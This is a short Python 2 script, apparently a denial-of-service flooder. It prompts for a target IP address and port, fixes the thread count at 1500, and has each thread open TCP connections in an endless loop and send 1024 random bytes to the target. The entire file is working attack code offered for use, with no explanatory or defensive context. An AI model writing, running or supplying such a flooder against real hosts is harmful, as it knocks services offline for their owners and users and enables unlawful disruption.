import threading
import socket
import random
import time

IP = raw_input("IP : ")
Port = input("Port : ")
thread_num = input("Threads ( Default 1500 ) : ")
thread_num = 1500
print "Please Wait While Packages Are Preparing Thread :",thread_num
time.sleep(5)

def run():
	bytes = random._urandom(1024)
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((str(IP),int(Port))) 
			s.send(bytes)
			print "Package Sent !"
		except:
			s.close()
			print "Error , Socket Closed"
			
for i in range(thread_num):
    th = threading.Thread(target = run)
    th.start()
